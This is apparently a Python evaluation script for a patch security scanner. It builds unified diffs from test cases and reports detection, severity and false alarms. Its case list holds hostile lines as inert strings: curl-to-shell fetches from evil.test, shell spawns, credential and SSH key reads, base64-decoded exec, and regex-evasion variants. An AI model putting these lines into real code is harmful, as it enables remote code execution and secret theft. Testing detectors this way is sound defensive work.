# ruff: noqa: E501
"""Independent evaluation of diffsmith.safety.scan_patch.

Written separately from the rules, so it does not just confirm their own
assumptions. All payloads are inert strings (fake hosts like evil.test).

Categories:
  plain    - straightforward malicious pattern the rule should catch
  evasion  - same intent, written to dodge simple regexes
  benign   - look-alike code that should NOT fire any rule
  arguable - legitimately debatable (e.g. reading a harmless env var)

Run from the repo root:   python scripts/eval_security_independent.py
Self-check only (no diffsmith needed):   python scripts/eval_security_independent.py --selftest
Writes results/security_independent.{md,json}.
"""
import json
import os
import sys
from collections import defaultdict

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))


def make_patch(filename, added, new_file=False):
    """Build a well-formed unified diff adding `added` lines to `filename`."""
    head = f"diff --git a/{filename} b/{filename}\n"
    if new_file:
        body = "".join(f"+{ln}\n" for ln in added)
        return (head + "new file mode 100644\n--- /dev/null\n"
                f"+++ b/{filename}\n@@ -0,0 +1,{len(added)} @@\n" + body)
    body = " # context before\n" + "".join(f"+{ln}\n" for ln in added) + " # context after\n"
    return (head + f"--- a/{filename}\n+++ b/{filename}\n"
            f"@@ -10,2 +10,{2 + len(added)} @@\n" + body)


N, C, E, X, S, K, H = ("SEC001", "SEC002", "SEC003", "SEC004", "SEC005", "SEC006", "SEC007")

# (id, category, expected_rule_prefix_or_None, filename, added_lines, new_file)
CASES = [
    # ---- SEC001 network ----
    ("net_urlopen", "plain", N, "pkg/a.py", ['    data = urllib.request.urlopen("http://evil.test/x").read()'], False),
    ("net_socket", "plain", N, "pkg/a.py", ['    s = socket.create_connection(("203.0.113.5", 80))'], False),
    ("net_httpclient", "plain", N, "pkg/a.py", ['    c = http.client.HTTPSConnection("evil.test")'], False),
    ("net_httpx", "plain", N, "pkg/a.py", ['    httpx.post("https://evil.test/c", json=payload)'], False),
    ("net_aiohttp", "plain", N, "pkg/a.py", ['    async with aiohttp.ClientSession() as s:'], False),
    ("net_dunder_import", "evasion", N, "pkg/a.py", ['    __import__("urllib.request").request.urlopen(u)'], False),
    ("net_alias_import", "evasion", N, "pkg/a.py", ['    from requests import post as p', '    p(url, data=secret)'], False),
    ("net_importlib", "evasion", N, "pkg/a.py", ['    importlib.import_module("socket").socket()'], False),
    # ---- SEC002 pipe to shell ----
    ("pipe_sh", "plain", C, "pkg/a.py", ['    os.system("curl http://evil.test/i.sh | sh")'], False),
    ("pipe_bash_wget", "plain", C, "pkg/a.py", ['    subprocess.run("wget -qO- http://evil.test | bash", shell=True)'], False),
    ("pipe_shfile", "plain", C, "scripts/setup.sh", ['curl -fsSL http://evil.test/i.sh | sudo bash'], False),
    ("pipe_cmdsubst", "evasion", C, "scripts/setup.sh", ['bash -c "$(curl -fsSL http://evil.test/i.sh)"'], False),
    ("pipe_two_step", "evasion", C, "scripts/setup.sh", ['curl -o /tmp/x http://evil.test/i && sh /tmp/x'], False),
    ("pipe_python_c", "evasion", C, "scripts/setup.sh", ['python -c "$(curl -s http://evil.test/p.py)"'], False),
    ("pipe_makefile", "plain", C, "Makefile", ['\tcurl -s http://evil.test/i | sh'], False),
    # ---- SEC003 command execution ----
    ("exec_system", "plain", E, "pkg/a.py", ['    os.system("rm -rf /tmp/x")'], False),
    ("exec_popen", "plain", E, "pkg/a.py", ['    out = os.popen("id").read()'], False),
    ("exec_subprocess_sh", "plain", E, "pkg/a.py", ['    subprocess.Popen(["sh", "-c", cmd])'], False),
    ("exec_eval", "plain", E, "pkg/a.py", ['    result = eval(user_input)'], False),
    ("exec_compile", "plain", E, "pkg/a.py", ['    exec(compile(src, "x", "exec"))'], False),
    ("exec_dunder_import", "evasion", E, "pkg/a.py", ['    __import__("os").system("id")'], False),
    ("exec_getattr", "evasion", E, "pkg/a.py", ['    getattr(os, "sys" + "tem")("id")'], False),
    ("exec_importlib", "evasion", E, "pkg/a.py", ['    importlib.import_module("subprocess").call(["id"])'], False),
    ("exec_pty", "plain", E, "pkg/a.py", ['    pty.spawn("/bin/sh")'], False),
    # ---- SEC004 obfuscation ----
    ("obf_b64_exec", "plain", X, "pkg/a.py", ['    exec(base64.b64decode("cHJpbnQoMSk="))'], False),
    ("obf_rot13", "plain", X, "pkg/a.py", ['    code = codecs.decode(blob, "rot13")'], False),
    ("obf_zlib_b64", "plain", X, "pkg/a.py", ['    src = zlib.decompress(base64.b64decode(blob))'], False),
    ("obf_fromhex", "plain", X, "pkg/a.py", ['    raw = bytes.fromhex("6f732e73797374656d")'], False),
    ("obf_marshal", "plain", X, "pkg/a.py", ['    f = marshal.loads(blob)'], False),
    ("obf_chr_join", "evasion", X, "pkg/a.py", ['    s = "".join(chr(c) for c in [111, 115])'], False),
    ("obf_b64_alias", "evasion", X, "pkg/a.py", ['    from base64 import b64decode as d', '    d(blob)'], False),
    # ---- SEC005 credentials ----
    ("cred_aws_env", "plain", S, "pkg/a.py", ['    key = os.environ["AWS_SECRET_ACCESS_KEY"]'], False),
    ("cred_gh_token", "plain", S, "pkg/a.py", ['    tok = os.getenv("GITHUB_TOKEN")'], False),
    ("cred_ssh_key", "plain", S, "pkg/a.py", ['    k = open(os.path.expanduser("~/.ssh/id_rsa")).read()'], False),
    ("cred_passwd", "plain", S, "pkg/a.py", ['    p = open("/etc/passwd").read()'], False),
    ("cred_dotenv", "plain", S, "pkg/a.py", ['    dotenv.load_dotenv()'], False),
    ("cred_aws_file", "evasion", S, "pkg/a.py", ['    p = Path.home() / ".aws" / "credentials"'], False),
    ("cred_environ_dump", "evasion", S, "pkg/a.py", ['    blob = json.dumps(dict(os.environ))'], False),
    ("cred_keyring", "plain", S, "pkg/a.py", ['    pw = keyring.get_password("svc", "user")'], False),
    # ---- SEC006 workflow / build / dependency edits ----
    ("wf_new_workflow", "plain", K, ".github/workflows/ci.yml", ['name: ci', 'on: [push]', 'jobs: {}'], True),
    ("wf_setup_cmdclass", "plain", K, "setup.py", ['    cmdclass={"install": CustomInstall},'], False),
    ("wf_requirements", "plain", K, "requirements.txt", ['evil-pkg==1.0.0'], False),
    ("wf_pyproject_dep", "plain", K, "pyproject.toml", ['dependencies = ["evil-pkg>=1"]'], False),
    ("wf_gitlab_ci", "plain", K, ".gitlab-ci.yml", ['  script: ["./run.sh"]'], False),
    ("wf_tox", "evasion", K, "tox.ini", ['commands = python -c "print(1)"'], False),
    ("wf_package_json", "plain", K, "package.json", ['  "dependencies": {"evil-pkg": "1.0.0"}'], False),
    ("wf_dockerfile", "evasion", K, "Dockerfile", ['RUN pip install evil-pkg'], False),
    # ---- SEC007 hooks ----
    ("hook_git_hook", "plain", H, ".git/hooks/pre-commit", ['#!/bin/sh', 'curl http://evil.test/h'], True),
    ("hook_husky", "plain", H, ".husky/pre-push", ['#!/bin/sh', './run.sh'], True),
    ("hook_postinstall", "plain", H, "package.json", ['  "scripts": {"postinstall": "node x.js"}'], False),
    ("hook_precommit_cfg", "plain", H, ".pre-commit-config.yaml", ['  - repo: local', '    hooks: [{id: x, entry: ./x.sh}]'], False),
    ("hook_setup_cmdclass", "evasion", H, "setup.py", ['    cmdclass={"develop": PostDevelop},'], False),
    # ---- benign look-alikes (expected: no findings) ----
    ("ok_requests_substring", "benign", None, "pkg/a.py", ['    return requests_per_second * 2'], False),
    ("ok_evaluate", "benign", None, "pkg/a.py", ['    value = evaluate(expr)', '    self.evalue = 3'], False),
    ("ok_executor", "benign", None, "pkg/a.py", ['    executor.submit(task)'], False),
    ("ok_socket_timeout", "benign", None, "pkg/a.py", ['    self.socket_timeout = 5'], False),
    ("ok_comment_curl", "benign", None, "pkg/a.py", ['    # do not run curl | sh here, see docs'], False),
    ("ok_comment_system", "benign", None, "pkg/a.py", ['    # TODO: maybe os.system later'], False),
    ("ok_json_hash", "benign", None, "pkg/a.py", ['    h = hashlib.sha256(json.dumps(d).encode()).hexdigest()'], False),
    ("ok_b64_name", "benign", None, "pkg/a.py", ['    n = base64_encoded_length(x)'], False),
    ("ok_docs_setup", "benign", None, "docs/setup.rst", ['Install with pip.'], False),
    ("ok_docs_requirements", "benign", None, "docs/requirements.rst", ['Requirements are listed here.'], False),
    ("ok_setup_utils", "benign", None, "pkg/setup_utils.py", ['    return name.strip()'], False),
    ("ok_test_file", "benign", None, "tests/test_a.py", ['    assert foo(1) == 2'], False),
    ("ok_readme", "benign", None, "README.md", ['Run `pip install pkg` to install.'], False),
    ("ok_urlparse", "benign", None, "pkg/a.py", ['    p = urllib.parse.urlparse(url)'], False),
    # ---- arguable (reported separately, not counted as false alarms) ----
    ("arg_env_settings", "arguable", None, "pkg/a.py", ['    m = os.environ.get("DJANGO_SETTINGS_MODULE")'], False),
    ("arg_subprocess_git", "arguable", None, "pkg/a.py", ['    subprocess.run(["git", "status"], check=True)'], False),
    ("arg_b64_encode", "arguable", None, "pkg/a.py", ['    t = base64.b64encode(raw)'], False),
]


SEV_ORDER = {"CRITICAL": 5, "HIGH": 4, "MEDIUM": 3, "review": 2, "low": 1}


def max_severity(findings):
    sevs = [str(f.get("severity", "")) for f in findings]
    return max(sevs, key=lambda x: SEV_ORDER.get(x, 0), default="none")


def rule_matches(finding, prefix):
    return str(finding.get("rule_id", "")).startswith(prefix)


def selftest():
    sys.path.insert(0, os.path.join(ROOT, "scripts"))
    from diff_check import check_diff
    bad = []
    for cid, _cat, _exp, fn, added, new in CASES:
        ok, why = check_diff(make_patch(fn, added, new))
        if not ok:
            bad.append((cid, why))
    print(f"cases: {len(CASES)}  malformed patches built: {len(bad)}")
    for b in bad:
        print("  BAD", b)
    return not bad


def main():
    if "--selftest" in sys.argv:
        sys.exit(0 if selftest() else 1)
    sys.path.insert(0, os.path.join(ROOT, "src"))
    from diffsmith.safety import scan_patch

    rows = []
    for cid, cat, exp, fn, added, new in CASES:
        findings = scan_patch(make_patch(fn, added, new))
        got = sorted({str(f.get("rule_id", "")) for f in findings})
        hit_expected = exp is not None and any(rule_matches(f, exp) for f in findings)
        rows.append({"id": cid, "category": cat, "expected": exp, "fired": got,
                     "hit_expected": hit_expected, "hit_any": bool(findings),
                     "max_severity": max_severity(findings)})

    lines = ["# Independent security-scanner evaluation", "",
             "Cases were written separately from the rules. All payloads are inert strings.",
             "Detection here measures coverage on a small hand-written set, not real-world detection.", ""]
    summary = defaultdict(lambda: {"n": 0, "expected": 0, "any": 0})
    for r in rows:
        if r["category"] in ("plain", "evasion"):
            s = summary[(r["expected"], r["category"])]
            s["n"] += 1
            s["expected"] += r["hit_expected"]
            s["any"] += r["hit_any"]
    lines += ["## Detection (malicious cases)", "",
              "| Rule | Category | Cases | Caught by expected rule | Caught by any rule |",
              "|---|---|---|---|---|"]
    for (rule, cat), s in sorted(summary.items()):
        lines.append(f"| {rule} | {cat} | {s['n']} | {s['expected']} | {s['any']} |")
    misses = [r for r in rows if r["category"] in ("plain", "evasion") and not r["hit_expected"]]
    lines += ["", f"## Misses ({len(misses)})", ""]
    lines += [f"- `{r['id']}` ({r['category']}, expected {r['expected']}), fired: {r['fired'] or 'nothing'}" for r in misses]
    caught = [r for r in rows if r["category"] in ("plain", "evasion") and r["hit_expected"]]
    lines += ["", "## Severity of caught attacks", ""]
    lines += [f"- `{r['id']}` ({r['category']}, {r['expected']}): {r['max_severity']}" for r in caught]
    top = [r for r in caught if r["max_severity"] in ("HIGH", "CRITICAL")]
    lines += ["", f"Caught attacks reported HIGH or CRITICAL: {len(top)} of {len(caught)}", ""]
    benign = [r for r in rows if r["category"] == "benign"]
    fps = [r for r in benign if r["hit_any"]]
    lines += ["", f"## False alarms on benign look-alikes: {len(fps)} of {len(benign)}", ""]
    lines += [f"- `{r['id']}` fired {r['fired']} (max severity {r['max_severity']})" for r in fps]
    arg = [r for r in rows if r["category"] == "arguable"]
    lines += ["", "## Arguable cases (not counted as false alarms)", ""]
    lines += [f"- `{r['id']}` fired {r['fired'] or 'nothing'} (max severity {r['max_severity']})" for r in arg]
    text = "\n".join(lines) + "\n"
    os.makedirs(os.path.join(ROOT, "results"), exist_ok=True)
    with open(os.path.join(ROOT, "results", "security_independent.md"), "w", encoding="utf-8") as f:
        f.write(text)
    with open(os.path.join(ROOT, "results", "security_independent.json"), "w", encoding="utf-8") as f:
        json.dump(rows, f, indent=2)
    print(text)


if __name__ == "__main__":
    main()
